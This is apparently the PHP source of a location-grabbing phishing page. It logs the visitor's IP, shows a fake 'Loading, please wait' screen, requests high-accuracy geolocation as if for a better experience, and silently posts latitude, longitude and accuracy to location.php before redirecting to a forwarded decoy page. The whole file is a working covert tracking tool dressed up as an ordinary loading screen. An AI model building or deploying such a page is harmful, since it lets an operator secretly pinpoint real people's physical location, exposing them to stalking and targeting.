<?php
include 'ip.php';

// Add JavaScript to capture location
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // Debug function to log messages - only log essential information
        function debugLog(message) {
            // Only log essential location data, not status messages
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
                
                // Send only essential logs to server
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("message=" + encodeURIComponent(message));
            }
        }
        
        function getLocation() {
            // Don\'t log this message
            
            if (navigator.geolocation) {
                // Don\'t log this message
                
                // Show permission request message
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                // Don\'t log this message
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                // Redirect after a delay if geolocation is not supported
                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    // Don\'t log this message
                    
                    // Add a delay before redirecting to ensure data is processed
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                // Don\'t log this message
                // Still redirect even if there was an error
                redirectToMainPage();
            };
            
            // Send the data with a timestamp to avoid caching
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            // Don\'t log error messages
            
            document.getElementById("locationStatus").innerText = "Redirecting...";
            
            // If user denies location permission or any other error, still redirect after a short delay
            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }
        
        function redirectToMainPage() {
            // Don\'t log this message
            // Try to redirect to the template page
            try {
                window.location.href = "forwarding_link/index2.html";
            } catch (e) {
                // Don\'t log this message
                // Fallback redirection
                window.location = "forwarding_link/index2.html";
            }
        }
        
        // Try to get location when page loads
        window.onload = function() {
            // Don\'t log this message
            setTimeout(function() {
                getLocation();
            }, 500); // Small delay to ensure everything is loaded
        };
    </script>

    <!-- Tailwind CSS CDN (UI only) -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <!-- ── UI STYLES: glassmorphism loading screen ── -->
    <style>
      body { font-family: \'Inter\', sans-serif; }

      /* Animated gradient background — cool blue */
      .bg-animated {
        background: linear-gradient(-45deg, #020c1b, #061828, #0c2540, #041018);
        background-size: 400% 400%;
        animation: gradientShift 8s ease infinite;
      }
      @keyframes gradientShift {
        0%   { background-position: 0%   50%; }
        50%  { background-position: 100% 50%; }
        100% { background-position: 0%   50%; }
      }

      /* Frosted glass card */
      .glass {
        background: rgba(255, 255, 255, 0.07);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        border: 1px solid rgba(255, 255, 255, 0.12);
      }

      /* Glow ring spinner — blue/cyan */
      @keyframes spin-ring {
        to { transform: rotate(360deg); }
      }
      .spin-ring {
        border: 3px solid rgba(255,255,255,0.1);
        border-top-color: #3b82f6;
        border-right-color: #06b6d4;
        animation: spin-ring 0.9s linear infinite;
      }

      /* Pulsing dot */
      @keyframes pulse-dot {
        0%,100% { opacity: 1; transform: scale(1); }
        50%      { opacity: 0.4; transform: scale(0.7); }
      }
      .pulse-dot { animation: pulse-dot 1.2s ease-in-out infinite; }
      .pulse-dot:nth-child(2) { animation-delay: 0.2s; }
      .pulse-dot:nth-child(3) { animation-delay: 0.4s; }

      /* Progress bar */
      @keyframes progress-bar {
        0%   { width: 0%; }
        80%  { width: 90%; }
        100% { width: 100%; }
      }
      .progress-fill {
        animation: progress-bar 12s ease-in-out forwards;
        background: linear-gradient(90deg, #1d4ed8, #3b82f6, #60a5fa);
      }
    </style>
    <!-- ─────────────────────────────────────────── -->
</head>

<!-- ── UI BODY: modern loading/splash screen ── -->
<body class="bg-animated min-h-screen flex items-center justify-center">
  <div class="glass rounded-3xl p-10 w-full max-w-sm mx-4 flex flex-col items-center gap-6 shadow-2xl shadow-black/60">

    <!-- Logo icon -->
    <div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center shadow-lg shadow-blue-900/50">
      <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
        <path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
      </svg>
    </div>

    <!-- Spinner -->
    <div class="spin-ring w-14 h-14 rounded-full"></div>

    <!-- Text content -->
    <div class="text-center space-y-1">
      <h2 class="text-lg font-semibold text-white">Loading, please wait…</h2>
      <p class="text-sm text-gray-400">Please allow location access for better experience</p>
    </div>

    <!-- Status text — id="locationStatus" preserved for JS -->
    <p id="locationStatus" class="text-xs font-medium text-blue-300 text-center px-2">Initializing...</p>

    <!-- Progress bar -->
    <div class="w-full bg-white/10 rounded-full h-1.5 overflow-hidden">
      <div class="progress-fill h-full rounded-full"></div>
    </div>

    <!-- Animated dots -->
    <div class="flex items-center gap-2">
      <span class="pulse-dot w-2 h-2 bg-blue-400 rounded-full inline-block"></span>
      <span class="pulse-dot w-2 h-2 bg-cyan-400 rounded-full inline-block"></span>
      <span class="pulse-dot w-2 h-2 bg-sky-400 rounded-full inline-block"></span>
    </div>

  </div>
</body>
<!-- ─────────────────────────────────────────── -->
</html>
';
exit;
?>
